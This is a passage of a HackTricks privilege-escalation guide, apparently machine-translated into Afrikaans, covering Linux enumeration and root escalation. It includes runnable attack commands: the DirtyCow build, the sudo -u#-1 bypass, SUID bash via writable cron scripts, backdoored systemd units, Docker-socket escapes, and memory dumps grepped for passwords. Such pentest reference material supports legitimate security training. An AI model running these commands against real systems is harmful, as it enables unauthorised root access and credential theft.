# Linux Voorregverhoging

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Stelselinligting

### OS-inligting

Laten ons begin om 'n bietjie kennis van die bedryfstelsel wat loop, te verkry.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryftoestemmings op enige vouer binne die `PATH`-veranderlike het**, kan jy dalk sommige biblioteke of bineêre lêers kap.
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel-uitbuitings

Kontroleer die kernel-weergawe en of daar 'n uitbuiting is wat gebruik kan word om voorregte te eskaleer
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernweergawes en reeds **gekompileerde uitbuite** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Ander webwerwe waar jy sommige **gekompileerde uitbuite** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernweergawes van daardie webwerf te onttrek, kan jy die volgende doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Hulpmiddels wat kan help om te soek na kernel-uitbuite is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer UIT in slagoffer, kontroleer slegs uitbuite vir kernel 2.x)

**Soek altyd die kernel-weergawe in Google**, dalk is jou kernel-weergawe geskryf in 'n paar kernel-uitbuitings en dan sal jy seker wees dat hierdie uitbuiting geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo weergawe

Gebaseer op die kwesbare sudo weergawes wat voorkom in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het misluk

Kyk na **smasher2-boks van HTB** vir 'n **voorbeeld** van hoe hierdie kwetsbaarheid uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelselopname
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumereer moontlike verdedigings

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Uitbreek

As jy binne 'n Docker-houer is, kan jy probeer om daaruit te ontsnap:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Skywe

Kyk **wat is aan- en afgekoppel**, waar en hoekom. As enigiets afgekoppel is, kan jy probeer om dit aan te koppel en vir privaat inligting te ondersoek
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Enumerate nuttige bineêre lêers
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ook, kontroleer of **enige kompiler geïnstalleer is**. Dit is nuttig as jy 'n paar kernel-uitbuitings moet gebruik, aangesien dit aanbeveel word om dit te kompileer op die masjien waar jy dit gaan gebruik (of op een soortgelyk).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kwesbare sagteware geïnstalleer

Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Dalk is daar 'n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om voorregte te eskaleer...\
Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware te ondersoek.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Indien jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is.

{% hint style="info" %}
_Merk op dat hierdie bevele baie inligting sal toon wat meestal nutteloos sal wees, daarom word dit aanbeveel om sekere toepassings soos OpenVAS of soortgelyke te gebruik wat sal nagaan of enige geïnstalleerde sagteware weergawe kwesbaar is vir bekende aanvalle_
{% endhint %}

## Prosesse

Neem 'n kyk na **watter prosesse** uitgevoer word en kyk of enige proses **meer bevoegdhede het as wat dit behoort te hê** (miskien word 'n tomcat deur root uitgevoer?)
```bash
ps aux
ps -ef
top -n 1
```
Maak altyd seker dat daar moontlike [**electron/cef/chromium debuggers** aan die hardloop is, jy kan dit misbruik om voorregte te eskaleer](electron-cef-chromium-debugger-abuse.md). **Linpeas** ontdek dit deur die `--inspect` parameter binne die bevellyn van die proses te ondersoek.  
Kyk ook na jou voorregte oor die prosesse binêr lêers, miskien kan jy iemand oorskryf.

### Proseshantering

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes voldoen is.

### Proseshue

Sommige dienste van 'n bediener stoor **geloofsbriewe in die geheue in die teks**.  
Gewoonlik sal jy **root voorregte** benodig om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer geloofsbriewe wil ontdek.  
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.

{% hint style="warning" %}
Let daarop dat die meeste masjiene vandag **nie standaard ptrace toelaat nie** wat beteken dat jy nie ander prosesse wat aan jou onbevoorregte gebruiker behoort kan dump nie.

Die lêer _**/proc/sys/kernel/yama/ptrace\_scope**_ beheer die toeganklikheid van ptrace:

* **kernel.yama.ptrace\_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
* **kernel.yama.ptrace\_scope = 1**: slegs 'n ouerproses kan gedebug word.
* **kernel.yama.ptrace\_scope = 2**: Slegs 'n administrateur kan ptrace gebruik, aangesien dit die CAP\_SYS\_PTRACE-vermoë vereis.
* **kernel.yama.ptrace\_scope = 3**: Geen prosesse mag met ptrace nagespeur word nie. Nadat dit ingestel is, is 'n herlaai nodig om ptracing weer moontlik te maak.
{% endhint %}

#### GDB

As jy toegang het tot die geheue van 'n FTP-diens (byvoorbeeld) kan jy die Heap kry en binnein sy geloofsbriewe soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-skrip

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, wys **maps hoe geheue binne daardie proses se** virtuele adresruimte afgebeeld is; dit wys ook die **regte van elke afgebeelde streek**. Die **mem** pseudobestand **blootstel die prosesse se geheue self**. Uit die **maps** lêer weet ons watter **geheue streek leesbaar is** en hul verskuiwings. Ons gebruik hierdie inligting om **in die mem lêer te soek en alle leesbare streek te dump na 'n lêer**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan benader word deur gebruik te maak van /dev/kmem.\
Gewoonlik is `/dev/mem` slegs leesbaar deur **root** en die **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir Linux

ProcDump is 'n Linux-herverbeelding van die klassieke ProcDump-gereedskap uit die Sysinternals-pakket van gereedskap vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om 'n proses se geheue te dump, kan jy die volgende gebruik:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root vereistes verwyder en die proses wat deur jou besit, dump
* Skrip A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word benodig)

### Geldele uit Prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die verifikasieproses loop:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die proses dump (sien vorige afdelings om verskillende maniere te vind om die geheue van 'n proses te dump) en soek na geloofsbriewe binne die geheue:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die gereedskap [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike tekskredensiale uit die geheue** en uit sommige **bekende lêers** steel. Dit vereis root-voorregte om behoorlik te werk.

| Funksie                                            | Proseshernaam        |
| -------------------------------------------------- | -------------------- |
| GDM wagwoord (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                           | lightdm              |
| VSFTPd (Aktiewe FTP Verbindings)                   | vsftpd               |
| Apache2 (Aktiewe HTTP Basiese Verifisering-sessies)| apache2              |
| OpenSSH (Aktiewe SSH-sessies - Sudo Gebruik)       | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron take

Kyk of enige geskeduleerde taak kwesbaar is. Dalk kan jy voordeel trek uit 'n skriffie wat deur root uitgevoer word (wildcard kwesbaarheid? kan lêers wysig wat root gebruik? gebruik simbole? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron pad

Byvoorbeeld, binne _/etc/crontab_ kan jy die PAD vind: _PAD=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As die rootgebruiker binne hierdie crontab probeer om 'n bevel of skrips uit te voer sonder om die pad in te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root-skoot kry deur die volgende te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron gebruik 'n skrip met 'n wild card (Wildcard Injection)

As 'n skrip deur root uitgevoer word en 'n "**\***" binne 'n bevel het, kan jy dit uitbuit om onverwagte dinge te doen (soos privilige-escalation). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildkaart voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildkaart-uitbuitingstruuks:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron-skrips oorskrywing en simboolskakel

As jy **'n cron-skrips kan wysig** wat deur root uitgevoer word, kan jy baie maklik 'n skaal kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Indien die skripsie wat deur root uitgevoer word 'n **gids gebruik waar jy volle toegang tot het**, kan dit dalk nuttig wees om daardie gids te verwyder en 'n **symboliese skakelgids na 'n ander een te skep** wat 'n skripsie beheer wat deur jou beheer word.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron-werk

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy daarvan gebruik maak en voorregte eskaleer.

Byvoorbeeld, om **elke 0.1s te monitor vir 1 minuut**, **sorteer volgens minder uitgevoerde opdragte** en verwyder die opdragte wat die meeste uitgevoer is, kan jy doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses monitor en lys wat begin).

### Onsigbare cron take

Dit is moontlik om 'n cronjob te skep **deur 'n karretjie terug te plaas na 'n kommentaar** (sonder 'n nuwe lyn karakter), en die cron taak sal werk. Voorbeeld (let op die karretjie terug karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kyk of jy enige `.service` lêer kan skryf, as jy kan, **kan jy dit wysig** sodat dit jou **agterdeur uitvoer wanneer** die diens **begin**, **herlaai** of **gestop** word (miskien moet jy wag totdat die masjien herlaai word).\
Byvoorbeeld, skep jou agterdeur binne die .service lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diens-binêres

Onthou dat as jy **skryftoestemmings oor binêres wat deur dienste uitgevoer word** het, kan jy hulle verander vir agterdeure sodat wanneer die dienste heruitgevoer word, die agterdeure uitgevoer sal word.

### systemd PAD - Relatiewe Paaie

Jy kan die PAD sien wat deur **systemd** gebruik word met:
```bash
systemctl show-environment
```
Indien jy vind dat jy **kan skryf** in enige van die lêers van die pad, kan jy moontlik **bevoorregting eskaleer**. Jy moet soek na **relatiewe paaie wat gebruik word in dienskonfigurasie**-lêers soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dan, skep 'n **uitvoerbare** met dieselfde naam as die relatiewe pad binêre lêer binne die systemd PAD-vouer waar jy kan skryf, en wanneer die diens versoek word om die kwesbare aksie (**Begin**, **Stop**, **Herlaai**) uit te voer, sal jou **agterdeur uitgevoer word** (ongepriviligeerde gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Tydskakelaars**

**Tydskakelaars** is systemd eenheidslêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeure beheer. **Tydskakelaars** kan gebruik word as 'n alternatief vir cron aangesien hulle ingeboude ondersteuning vir kalender tydgebeurtenisse en monotoniese tydgebeurtenisse het en asinkroon uitgevoer kan word.

Jy kan al die tydskakelaars opsom met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n tydsaanduig kan wysig, kan jy dit laat uitvoer met sommige bestaandes van systemd.unit (soos 'n `.service` of 'n `.target`)
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Eenheid is:

> Die eenheid wat geaktiveer moet word wanneer hierdie tydhouer verloop. Die argument is 'n eenheidsnaam, waarvan die agtervoegsel nie ".timer" is nie. Indien nie gespesifiseer nie, is hierdie waarde verstek na 'n diens wat dieselfde naam as die tydhouereenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die eenheidsnaam wat geaktiveer word en die eenheidsnaam van die tydhouereenheid identies genoem word, behalwe vir die agtervoegsel.

Daarom, om hierdie toestemming te misbruik, sal jy nodig hê:

* Vind 'n paar systemd-eenheid (soos 'n `.service`) wat 'n **skryfbare binêre lêer uitvoer**
* Vind 'n paar systemd-eenheid wat 'n **relatiewe pad uitvoer** en jy het **skryfregte** oor die **systemd PAD** (om daardie uitvoerbare lêer te verpersoonlik)

**Leer meer oor tydhouers met `man systemd.timer`.**

### **Tydhouer Aktiveer**

Om 'n tydhouer te aktiveer, benodig jy root-gebruikersregte en moet jy uitvoer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Merk op dat die **tydhouer** geaktiveer word deur 'n simbooliese skakel daarna te skep in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix-domein-sokkels (UDS) maak **proseskommunikasie** moontlik op dieselfde of verskillende rekenaars binne klient-bedienermodelle. Hulle maak gebruik van standaard Unix-beskrywerlêers vir inter-rekenaarkommunikasie en word opgestel deur middel van `.socket`-lêers.

Sokkels kan gekonfigureer word met behulp van `.socket`-lêers.

**Leer meer oor sokkels met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters gekonfigureer word:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies is verskillend, maar 'n opsomming word gebruik om aan te dui **waar dit gaan luister** na die sokkel (die pad van die AF\_UNIX-sokkellêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
* `Accept`: Neem 'n booleaanse argument. As dit **waar** is, word 'n **diensinstansie geskep vir elke inkomende verbinding** en word slegs die verbindingsokkel daaraan oorgedra. As dit **onwaar** is, word al die luisterende sokkels self aan die beginnende diens eenheid oorgedra, en slegs een diens eenheid word geskep vir al die verbindinge. Hierdie waarde word geïgnoreer vir datagram sokkels en FIFO's waar 'n enkele diens eenheid onvoorwaardelik al die inkomende verkeer hanteer. **Standaard onwaar**. Vir prestasie redes word dit aanbeveel om nuwe duiwels slegs op 'n manier te skryf wat geskik is vir `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Neem een of meer opdraglyne, wat uitgevoer word **voor** of **na** die luisterende **sokkels**/FIFO's **geskep** en gebind word, onderskeidelik. Die eerste token van die opdraglyn moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
* `ExecStopPre`, `ExecStopPost`: Addisionele **opdragte** wat uitgevoer word **voor** of **na** die luisterende **sokkels**/FIFO's **gesluit** en verwyder word, onderskeidelik.
* `Service`: Spesifiseer die **diens** eenheidsnaam **om te aktiveer** met **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sokkels met Accept=no. Dit gaan standaard na die diens wat dieselfde naam as die sokkel dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket-lêers

As jy 'n **skryfbare** `.socket`-lêer vind, kan jy aan die begin van die `[Socket]`-afdeling iets soos voeg: `ExecStartPre=/home/kali/sys/backdoor` en die agterdeur sal uitgevoer word voordat die sokkel geskep word. Daarom sal jy **waarskynlik moet wag totdat die rekenaar herlaai is.**\
_Merk op dat die stelsel daardie sokkellêer-konfigurasie moet gebruik of die agterdeur sal nie uitgevoer word nie_

### Skryfbare sokkels

As jy enige skryfbare sokkel **identifiseer** (_nou praat ons oor Unix-sokkels en nie oor die konfigurasie `.socket`-lêers nie_), dan **kan jy kommunikeer** met daardie sokkel en miskien 'n kwesbaarheid uitbuit.

### Enumereer Unix-sokkels
```bash
netstat -a -p --unix
```
### Rou verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Uitbuiting voorbeeld:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sokkels

Merk op dat daar dalk **sokkels is wat luister vir HTTP** versoeke (_Ek praat nie van .socket lêers nie, maar van lêers wat as Unix sokkels optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Indien die sokkie **reageer met 'n HTTP** versoek, kan jy met dit ** kommunikeer ** en miskien ** 'n kwesbaarheid uitbuit **.

### Skryfbare Docker Sokkie

Die Docker-sokkie, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Om skryftoegang tot hierdie sokkie te hê, kan lei tot voorreg-escalasie. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Voorreg-escalasie met Docker CLI**

As jy skryftoegang tot die Docker-sokkie het, kan jy voorregte eskaleer deur die volgende opdragte te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie bevele stel jou in staat om 'n houer uit te voer met wortelvlak toegang tot die lêersisteem van die gasheer.

#### **Om die Docker API Direk te Gebruik**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker sokket steeds gemanipuleer word deur die Docker API en `curl` bevele.

1.  **Lys Docker Beelde:** Haal die lys van beskikbare beelde op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Skep 'n Houer:** Stuur 'n versoek om 'n houer te skep wat die gasheer se stelsel se hoofgids monteer.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Begin die nuutgeskepte houer:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Koppel aan die Houer:** Gebruik `socat` om 'n verbinding met die houer tot stand te bring, wat beveluitvoering binne-in dit moontlik maak.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat die `socat`-verbinding opgestel is, kan jy bevele direk in die houer uitvoer met wortelvlak toegang tot die gasheer se lêersisteem.

### Ander

Let daarop dat as jy skryfregte oor die docker sokket het omdat jy **binne die groep `docker`** is, het jy [**meer maniere om voorregte te eskaleer**](interesting-groups-linux-pe/#docker-group). As die [**docker API luister op 'n poort** kan jy dit ook dalk kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit te breek uit docker of dit te misbruik om voorregte te eskaleer** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) voorregte-escalasie

As jy vind dat jy die **`ctr`** bevel kan gebruik, lees die volgende bladsy aangesien **jy dit kan misbruik om voorregte te eskaleer**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** voorregte-escalasie

As jy vind dat jy die **`runc`** bevel kan gebruik, lees die volgende bladsy aangesien **jy dit kan misbruik om voorregte te eskaleer**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus is 'n gesofistikeerde **Inter-Process Communication (IPC) stelsel** wat programme in staat stel om doeltreffend te interaksieer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van program kommunikasie.

Die stelsel is veelsydig, ondersteun basiese IPC wat data-uitruil tussen prosesse verbeter, wat herinner aan **verbeterde UNIX-domein-sokkels**. Verder help dit om gebeure of seine uit te saai, wat naadlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler aanmoedig om te demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afgeleë objekstelsel, wat diensversoeke en metode-aanroepings tussen programme vereenvoudig, wat prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n **toelaat/weier model**, wat boodskappermissies (metode-oproepe, seinemissies, ens.) bestuur op grond van die kumulatiewe effek van ooreenstemmende beleidreëls. Hierdie beleide spesifiseer interaksies met die bus, wat moontlik voorregte-escalasie deur die uitbuiting van hierdie toestemmings toelaat.

